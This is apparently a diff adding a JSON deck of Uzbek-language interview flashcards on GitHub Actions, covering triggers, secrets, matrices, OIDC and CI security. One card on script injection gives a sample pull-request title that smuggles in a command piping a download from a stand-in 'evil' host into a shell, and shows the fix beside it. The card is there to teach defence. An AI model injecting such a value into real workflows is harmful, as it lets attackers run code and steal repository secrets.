@@ -1,0 +1,340 @@
+{
+  "id": "i8",
+  "name": "GitHub Actions",
+  "domain": "cicd",
+  "topics": [
+    "GitHub Actions"
+  ],
+  "questions": [
+    {
+      "id": 32000,
+      "code": "GHA1",
+      "level": "J",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "GitHub Actions'da workflow, job, step va action nima?",
+      "explanation": "Workflow = `.github/workflows/*.yml`; job = bitta runner'da ishlaydigan step'lar; step = `run` yoki `uses`; action = qayta ishlatiladigan blok."
+    },
+    {
+      "id": 32001,
+      "code": "GHA2",
+      "level": "J",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Workflow qaysi event'lar bilan ishga tushadi?",
+      "explanation": "`push`, `pull_request`, `schedule` (cron), `workflow_dispatch` (qo'lda), `release`, `workflow_call`, `repository_dispatch`; filter: `branches`, `paths`, `tags`."
+    },
+    {
+      "id": 32002,
+      "code": "GHA3",
+      "level": "J",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "`runs-on` nima? GitHub-hosted va self-hosted runner farqi?",
+      "explanation": "`runs-on` job qaysi runner'da ishlashini tanlaydi. Hosted: har job toza VM, GitHub boshqaradi. Self-hosted: o'z mashinang, state qoladi, xavfsizlik sening zimmangda."
+    },
+    {
+      "id": 32003,
+      "code": "GHA4",
+      "level": "J",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Secret qanday saqlanadi va ishlatiladi?",
+      "explanation": "Settings > Secrets (repo/environment/org). `${{ secrets.NAME }}` bilan, log'da avtomatik `***` maskalanadi. Fork PR'ga secret berilmaydi."
+    },
+    {
+      "id": 32004,
+      "code": "GHA5",
+      "level": "J",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "`needs` nima uchun kerak?",
+      "explanation": "Job'lar orasida bog'liqlik: `needs: build` — build muvaffaqiyatli tugamaguncha job boshlanmaydi. Output uzatish ham `needs.<job>.outputs` orqali."
+    },
+    {
+      "id": 33023,
+      "code": "GHA16",
+      "level": "J",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "`if:` sharti va status funksiyalari (`success()`, `failure()`, `always()`, `cancelled()`) qanday ishlaydi?",
+      "explanation": "`if:` job/step'ni shartli bajaradi. Default `success()`. `always()` — har doim, `failure()` — oldingisi yiqilsa, `cancelled()` — bekor qilinsa."
+    },
+    {
+      "id": 33024,
+      "code": "GHA17",
+      "level": "J",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "`env`, `vars` va `secrets` farqi?",
+      "explanation": "`env` — workflow/job/step darajasidagi o'zgaruvchi (YAML'da). `vars` — Settings'dagi maxfiy bo'lmagan konfiguratsiya. `secrets` — maxfiy, maskalanadi."
+    },
+    {
+      "id": 33025,
+      "code": "GHA18",
+      "level": "J",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Step'lar orasida qiymat qanday uzatiladi (`GITHUB_OUTPUT`, `GITHUB_ENV`)?",
+      "explanation": "`echo \"k=v\" >> $GITHUB_OUTPUT` — step output (`steps.<id>.outputs.k`). `echo \"K=v\" >> $GITHUB_ENV` — keyingi step'lar uchun env. Eski `::set-output` deprecated."
+    },
+    {
+      "id": 33026,
+      "code": "GHA19",
+      "level": "J",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Actions'da Docker image build qilib registry'ga (GHCR) push qilish qanday?",
+      "explanation": "`docker/login-action` (`GITHUB_TOKEN` + `packages: write`), `docker/setup-buildx-action`, `docker/build-push-action` cache bilan."
+    },
+    {
+      "id": 32005,
+      "code": "GHA6",
+      "level": "M",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Matrix strategy qanday ishlaydi?",
+      "explanation": "`strategy.matrix` bitta job'ni bir nechta kombinatsiyada ko'paytiradi (Go versiya × OS). `include`/`exclude`, `fail-fast`, `max-parallel`."
+    },
+    {
+      "id": 32006,
+      "code": "GHA7",
+      "level": "M",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Cache va artifact farqi nima?",
+      "explanation": "Cache — dependency'larni run'lar orasida qayta ishlatish (key bo'yicha, tezlik uchun). Artifact — run natijasini saqlash/job'lar orasida uzatish (binary, report)."
+    },
+    {
+      "id": 32007,
+      "code": "GHA8",
+      "level": "M",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Reusable workflow va composite action farqi?",
+      "explanation": "Reusable workflow (`workflow_call`) — butun job'lar to'plami, alohida runner, secrets uzatiladi. Composite action — step'lar to'plami, chaqiruvchi job ichida ishlaydi."
+    },
+    {
+      "id": 32008,
+      "code": "GHA9",
+      "level": "M",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Environment va protection rule nima beradi?",
+      "explanation": "Environment (`staging`, `production`) — o'z secret'lari, required reviewer approval, wait timer, faqat ma'lum branch'dan deploy."
+    },
+    {
+      "id": 32009,
+      "code": "GHA10",
+      "level": "M",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "`concurrency` kaliti nima uchun?",
+      "explanation": "Bir guruhda bir vaqtda faqat bitta run. `cancel-in-progress: true` — PR'ga yangi push eskisini bekor qiladi; deploy uchun — parallel deploy'ni oldini oladi."
+    },
+    {
+      "id": 33027,
+      "code": "GHA20",
+      "level": "M",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Job output'lari job'lar orasida qanday uzatiladi?",
+      "explanation": "Job darajasida `outputs:` step output'ga map qilinadi, keyingi job `needs.<job>.outputs.<name>` bilan o'qiydi. Faqat string, secret maskalangan bo'lsa bo'sh keladi."
+    },
+    {
+      "id": 33028,
+      "code": "GHA21",
+      "level": "M",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Dinamik matrix (`fromJSON`) va monorepo'da faqat o'zgargan servisni build qilish?",
+      "explanation": "Birinchi job o'zgargan papkalarni aniqlab JSON output beradi, ikkinchi job `matrix: ${{ fromJSON(...) }}` bilan faqat ularni build qiladi."
+    },
+    {
+      "id": 33029,
+      "code": "GHA22",
+      "level": "M",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "`workflow_run` va `workflow_dispatch`/`repository_dispatch` qachon ishlatiladi?",
+      "explanation": "`workflow_run` — boshqa workflow tugaganda (CI yashil bo'lsa deploy). `workflow_dispatch` — qo'lda/API, input bilan. `repository_dispatch` — tashqi tizimdan API orqali custom event."
+    },
+    {
+      "id": 33030,
+      "code": "GHA23",
+      "level": "M",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Release/tag asosidagi deploy pipeline qanday quriladi?",
+      "explanation": "`on: push: tags: ['v*']` — build, test, image'ni semver tag bilan push, GitHub Release yaratish, changelog; production environment approval bilan."
+    },
+    {
+      "id": 33031,
+      "code": "GHA24",
+      "level": "M",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "`continue-on-error`, `timeout-minutes` va retry qanday sozlanadi?",
+      "explanation": "`timeout-minutes` (default 360!) — osilgan job'ni o'ldiradi. `continue-on-error: true` — fail'ni job'ga ta'sir qildirmaydi (experimental matrix). Retry o'rnatilgan emas — action yoki skript bilan."
+    },
+    {
+      "id": 32010,
+      "code": "GHA11",
+      "level": "S",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "`pull_request_target` nega xavfli?",
+      "explanation": "Base repo kontekstida, secret'lar va write token bilan ishlaydi. Agar fork PR kodini checkout qilib build qilsa — hujumchi secret'ni o'g'irlaydi (pwn request)."
+    },
+    {
+      "id": 32011,
+      "code": "GHA12",
+      "level": "S",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Script injection (`${{ github.event... }}` in `run`) qanday yuz beradi?",
+      "explanation": "`${{ }}` YAML'da shell skriptga matn sifatida qo'yiladi. PR title `\"; curl evil | sh; #` bo'lsa — buyruq bajariladi. Yechim: `env:` orqali o'zgaruvchi qilib uzatish."
+    },
+    {
+      "id": 32012,
+      "code": "GHA13",
+      "level": "S",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "OIDC bilan cloud'ga secretsiz deploy qanday ishlaydi?",
+      "explanation": "`permissions: id-token: write` — job GitHub'dan qisqa muddatli JWT oladi; AWS/GCP/Azure trust policy'si `sub` claim (repo, branch, environment) bo'yicha tekshirib vaqtinchalik credential beradi."
+    },
+    {
+      "id": 32013,
+      "code": "GHA14",
+      "level": "S",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "`GITHUB_TOKEN` permission'larini qanday cheklaysiz va nega?",
+      "explanation": "Workflow/job darajasida `permissions:` bilan least privilege: default `contents: read`, kerakli joyda alohida write. Org darajasida default read-only."
+    },
+    {
+      "id": 32014,
+      "code": "GHA15",
+      "level": "S",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Third-party action'larni nega SHA bilan pin qilish kerak?",
+      "explanation": "Tag (`@v4`) o'zgaruvchan — maintainer yoki hujumchi uni boshqa commit'ga ko'chirishi mumkin (tj-actions/changed-files 2025 hodisasi). Full commit SHA immutable."
+    },
+    {
+      "id": 33032,
+      "code": "GHA25",
+      "level": "S",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Self-hosted runner'larni K8s'da (ARC) qanday ishlatasiz?",
+      "explanation": "Actions Runner Controller — runner scale set, har job uchun ephemeral pod, queue bo'yicha autoscale (0 gacha). Xavfsizlik: ephemeral, alohida namespace, network policy, DinD o'rniga rootless build."
+    },
+    {
+      "id": 33033,
+      "code": "GHA26",
+      "level": "S",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Merge queue nima muammoni yechadi va CI'ni qanday moslash kerak?",
+      "explanation": "PR'lar alohida yashil, birga `main`ni sindirishi mumkin. Merge queue PR'ni navbatdagi o'zgarishlar ustida test qiladi va faqat yashil bo'lsa merge qiladi. Workflow `merge_group` event'ini tinglashi shart."
+    },
+    {
+      "id": 33034,
+      "code": "GHA27",
+      "level": "S",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Artifact attestation / SLSA provenance Actions'da qanday qilinadi?",
+      "explanation": "`actions/attest-build-provenance` — Sigstore orqali imzolangan provenance (qaysi repo, commit, workflow build qilgan). Deploy oldidan `gh attestation verify` yoki K8s admission policy bilan tekshiriladi."
+    },
+    {
+      "id": 33035,
+      "code": "GHA28",
+      "level": "S",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Flaky testlar CI'ni buzayotgan bo'lsa nima qilasiz?",
+      "explanation": "O'lcha (test bo'yicha fail rate), quarantine (alohida, required emas job), root cause (vaqt, tartib, parallel, tarmoq, shared state), tuzat, keyin qaytar. Retry — vaqtinchalik yamoq, yechim emas."
+    },
+    {
+      "id": 33036,
+      "code": "GHA29",
+      "level": "S",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Actions xarajati va tezligini qanday optimallashtirasiz?",
+      "explanation": "Measure (workflow vaqti, billable minutes, queue) > keraksiz trigger'ni kesish (`paths`, `concurrency cancel`) > cache > parallel/sharding > katta runner faqat kerakli job'ga > self-hosted/ARC katta hajmda."
+    },
+    {
+      "id": 33037,
+      "code": "GHA30",
+      "level": "S",
+      "type": "card",
+      "topic": "GitHub Actions",
+      "domain": "cicd",
+      "section": "i8",
+      "question": "Ko'p repo'li organizatsiyada CI standartini qanday boshqarasiz?",
+      "explanation": "Markaziy reusable workflow'lar (versiyalangan), org ruleset'lar (required workflow/check), action allowlist, default `GITHUB_TOKEN` read-only, Dependabot bilan action update, OIDC trust policy shabloni."
+    }
+  ]
+}
